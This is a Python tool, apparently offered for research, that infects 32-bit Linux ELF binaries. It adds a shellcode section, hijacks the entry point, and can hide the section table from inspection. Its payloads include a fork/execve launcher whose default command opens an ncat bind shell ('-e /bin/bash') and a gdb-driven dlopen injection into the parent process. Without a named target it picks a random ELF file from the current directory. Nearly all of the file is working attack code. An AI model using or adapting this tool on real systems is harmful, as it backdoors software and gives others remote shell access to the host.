#!/usr/bin/python3

# entryhijacker
# Developed by Branitskiy Alexander
# Use accurately and only for research purposes!

import lief
from pwn import asm, shellcraft, context
import os
import random as rd

# Set architecture
context.arch = 'i386'
context.os = 'linux'

class EntryHijacker:
  def __init__(self, in_binary_file):
    # Parse input file
    in_binary_file = args.binary
    if in_binary_file is None: # find some binary ELF 32-bit file
      in_binary_files = [entry.path for entry in os.scandir('./') \
                         if entry.is_file() and self.__is_elf32(entry.path)]
      if len(in_binary_files) > 0:
        in_binary_file = rd.choice(in_binary_files)
    if in_binary_file is None or not os.path.isfile(in_binary_file):
      print(f"File {in_binary_file or ''} was not found")
      exit(1)
    self.in_binary_file = in_binary_file
    self.binary = lief.parse(self.in_binary_file)
    self.orig_entry = self.binary.header.entrypoint
    self.code_sections = {}

  def add_new_entry_section(self, section_name=".my_hook", section_size=512):
    # Add an empty section so that LIEF can allocate a virtual address to it
    code_obj = lief.ELF.Section(section_name, lief.ELF.Section.TYPE.PROGBITS)
    code_obj.content = list(asm("nop") * section_size)
    code_obj.flags = int(lief.ELF.Section.FLAGS.ALLOC) | int(lief.ELF.Section.FLAGS.EXECINSTR)
    code_section = self.binary.add(code_obj, loaded=True)
    base_addr = code_section.virtual_address
    self.code_sections[base_addr] = code_section
    return base_addr

  # Check a file is 32-bit ELF
  @staticmethod
  def __is_elf32(filepath):
    try:
      with open(filepath, 'rb') as f:
        header = f.read(5)
        # Check a signature ELF (\x7fELF) and the 5-th byte (1 is 32-bit)
        return header.startswith(b'\x7fELF') and header[4] == 1
    except (IOError, IndexError):
      return False

  def rcv_gotplt_addr(self, symbol_name):
    # Find function address by its name
    for reloc in self.binary.pltgot_relocations:
      if reloc.has_symbol and reloc.symbol.name == symbol_name:
        return reloc.address
    return None

  def insert_code_into_entry_section(self, base_addr, shellcode_bytes):
    assert(base_addr in self.code_sections.keys())
    # Initialize code within new section
    self.code_sections[base_addr].content = shellcode_bytes

    # Set a new entry point
    self.binary.header.entrypoint = base_addr

  def generate_output_file(self, hide_sections, output_suffix):
    # Write the output file
    out_binary_file = self.in_binary_file + output_suffix
    self.binary.write(out_binary_file)

    # Add execution permission (chmod +x)
    mode = os.stat(out_binary_file).st_mode
    os.chmod(out_binary_file, mode | 0o111)
    print(f"The file {out_binary_file} was generated from {self.in_binary_file}")

    # This will make 'readelf -S' useless
    if hide_sections:
      # Cut the section table (Section Header Table)
      # There are zero sections and the table is at the beginning of the file
      self.binary.header.numberof_sections = 0
      self.binary.header.section_header_size = 0
      # Write the output file and set execution permission
      self.binary.write(out_binary_file)
      os.chmod(out_binary_file, mode | 0o111)
      print(f"All sections are hidden, try running: 'readelf -S {out_binary_file}' to check it")

if __name__ == "__main__":
  # List functions for creating a shellcode on a pure ASM

  def create_stuckinf_byte_code():
    print("Insert infinite loop")
    return list(asm("jmp $")) # in bytes: # [0xEB, 0xFE]

  def create_earlyexit_byte_code(exit_code=123):
    print(f"Insert call of exit with exit code {exit_code}")
    exit_code = args.exit_code
    EXIT_ID = 1 # syscall_id of exit
    shellcode_asm = f"""
  mov ebx, {exit_code} /* set exit code */
  mov eax, {EXIT_ID} /* call exit */
  int 0x80 /* call system interruption */
"""
    return list(asm(shellcode_asm))

  def create_writemsg_byte_code(orig_entry, base_addr, message='HOW ARE YOU?'):
    print(f"Insert call of write with argument {message}")
    # Create a shellcode structure: [JMP CODE_ADDR] + [MSG] + [CODE]
    # Instruction JMP SHORT CODE_ADDR (occupies 2 bytes) jumps over the message
    # Jump code: jump by the length of the message + 2 bytes of the jmp instruction itself
    msg = message.encode('utf-8') + b'\n'
    jump_over_msg = list(asm(f"jmp $+{2 + len(msg)}"))
    msg_addr = base_addr + 2 # message address after JMP
    STDOUT = 1
    #write_asm = f"""mov ebx, {STDOUT}
    #  mov ecx, {msg_addr}
    #  mov edx, {len(msg)}
    #  mov eax, 4
    #  int 0x80"""
    write_asm = shellcraft.write(STDOUT, msg_addr, len(msg))
    shellcode_asm = f"""
  pushad /* save current values of all registers */
  {write_asm} /* syscall write */
  popad /* restore previous values of all registers */
  mov eax, {orig_entry} /* jump to the original entry point */
  jmp eax
"""
    return jump_over_msg + list(msg) + list(asm(shellcode_asm))

  def create_putsmsg_byte_code(orig_entry, base_addr, gotplt_puts_addr, message="I'M FINE!"):
    print(f"Insert call of puts with argument {message}")
    # Create a shellcode structure: [JMP CODE_ADDR] + [MSG] + [CODE]
    # Instruction JMP SHORT CODE_ADDR (occupies 2 bytes) jumps over the message
    # Jump code: jump by the length of the message + 2 bytes of the jmp instruction itself
    msg = message.encode('utf-8') + b'\x00'
    jump_over_msg = list(asm(f"jmp $+{2 + len(msg)}"))
    msg_addr = base_addr + 2 # message address after JMP
    shellcode_asm = f"""
  pushad /* save current values of all registers */
  push {msg_addr} /* argument of puts */
  mov eax, {gotplt_puts_addr} /* intialize eax as address of puts */
  call dword ptr [eax] /* call puts */
  add esp, 4 /* clear stack from argument */
  popad /* restore previous values of all registers */
  mov eax, {orig_entry} /* jump to the original entry point */
  jmp eax
"""
    return jump_over_msg + list(msg) + list(asm(shellcode_asm))

  def create_forkexecve_byte_code(orig_entry, sh_cmd="ncat -l -p 12345 -e /bin/bash"):
    print(f"Insert call of command {sh_cmd}")
    FORK_ID = 2 # syscall_id of fork
    forkexecve_asm = f"""
  xor eax, eax
  mov al, {FORK_ID}
  int 0x80
  test eax, eax
  jnz parent_proc /* if PID > 0 then goto a parent code */
  {shellcraft.i386.linux.execve(path='/bin/sh',
   argv=['/bin/sh', '-c', sh_cmd], envp={})}
"""
    EXIT_ID = 1 # syscall_id of exit
    shellcode_asm = f"""
  pushad /* save current values of all registers */
  {forkexecve_asm} /* syscalls fork and execve */
  mov eax, {EXIT_ID} /* if execve was failed then exit */
  int 0x80
parent_proc: /* parent code */
  popad /* restore previous values of all registers */
  mov eax, {orig_entry} /* jump to the original entry point */
  jmp eax
"""
    return list(asm(shellcode_asm))

  # Type a command:
  # echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
  def create_dlopen_byte_code(orig_entry, dll_name="./test_call_sh.so"):
    print(f"Insert call of command dlopen({dll_name}) via gdb-based injection")
    # Create a command for gdb
    # -p $PPID: attack to parent process (which calls fork)
    # -ex: execute a command 'call dlopen'
    # --batch: exit after execution
    # RTLD_LAZY = 1
    RTLD_NOW = 2
    dlopen_ptr = "(void*)__libc_dlopen_mode"
    gdb_cmd = f"gdb -q -p $PPID --batch -ex " + \
              f"'call {dlopen_ptr}(\"{dll_name}\", {RTLD_NOW})' " + \
              f"-ex 'detach' -ex 'quit' >/dev/null 2>&1"
    FORK_ID = 2 # syscall_id of fork
    forkexecve_asm = f"""
  xor eax, eax
  mov al, {FORK_ID}
  int 0x80
  test eax, eax
  jnz parent_proc /* if PID > 0 then goto a parent code */
  {shellcraft.i386.linux.execve(path='/bin/sh',
   argv=['/bin/sh', '-c', gdb_cmd], envp={})}
"""
    EXIT_ID = 1 # syscall_id of exit
    NANO_SLEEP = 162 # syscall_id of nano_sleep
    shellcode_asm = f"""
  pushad /* save current values of all registers */
  {forkexecve_asm} /* syscalls fork and execve */
  mov eax, {EXIT_ID} /* if execve was failed then exit */
  int 0x80
parent_proc: /* parent code */
  push 0 /* tv_nsec = 0 */
  push 2 /* tv_sec  = 2 */
  mov ebx, esp /* ebx - the first argument of nano_sleep */
  xor ecx, ecx /* ecx = NULL - the second argument of nano_sleep */
  mov eax, {NANO_SLEEP} /* initialize eax */
  int 0x80 /* call nano_sleep */
  add esp, 8 /* clear stack from the first argument */
  popad /* restore previous values of all registers */
  mov eax, {orig_entry} /* jump to the original entry point */
  jmp eax
"""
    return list(asm(shellcode_asm))

  import argparse

  parser = argparse.ArgumentParser(description="ELF Entry Point Hijacker")
  parser.add_argument("binary", nargs='?', default=None,
                      help="Target ELF binary to hijack (default: random file from current directory)")
  parser.add_argument("--hide_sections", default=False, action="store_true", help="Hide ELF sections")
  parser.add_argument("--output_suffix", default="", help="Set suffix of generated file")
  parser.add_argument("--hijacker_type",
                      choices=["stuckinf", "earlyexit", "writemsg", "putsmsg", "forkexecve", "dlopen"],
                      default="forkexecve", help="Set hijacker type (default: %(default)s)")
  parser.add_argument("--exit_code", type=int, default=123,
                      help="Set exit code (default: %(default)s)")
  parser.add_argument("--message", type=str, default="HELLO!",
                      help="Message to print (default: %(default)s)")
  parser.add_argument("--command", type=str, default="echo 'Hacked'",
                      help="Command to run in background (default: %(default)s)")
  parser.add_argument("--dll_name", type=str, default="./test_call_sh.so",
                      help="DLL name to run in background (default: %(default)s)")

  args = parser.parse_args()

  entry_hijacker = EntryHijacker(args.binary)
  base_addr = entry_hijacker.add_new_entry_section()
  print(f"Original entry point: {hex(entry_hijacker.orig_entry)}, new base address: {hex(base_addr)}")

  shellcode_bytes = None
  if args.hijacker_type == "stuckinf":
    shellcode_bytes = create_stuckinf_byte_code()
  elif args.hijacker_type == "earlyexit":
    shellcode_bytes = create_earlyexit_byte_code(args.exit_code)
  elif args.hijacker_type == "writemsg":
    shellcode_bytes = create_writemsg_byte_code(entry_hijacker.orig_entry, base_addr, args.message)
  elif args.hijacker_type == "putsmsg":
    gotplt_puts_addr = entry_hijacker.rcv_gotplt_addr("puts")
    assert(gotplt_puts_addr is not None)
    shellcode_bytes = create_putsmsg_byte_code(entry_hijacker.orig_entry, base_addr, gotplt_puts_addr, args.message)
  elif args.hijacker_type == "forkexecve":
    shellcode_bytes = create_forkexecve_byte_code(entry_hijacker.orig_entry, args.command)
  elif args.hijacker_type == "dlopen":
    shellcode_bytes = create_dlopen_byte_code(entry_hijacker.orig_entry, args.dll_name)

  entry_hijacker.insert_code_into_entry_section(base_addr, shellcode_bytes)
  entry_hijacker.generate_output_file(args.hide_sections, args.output_suffix)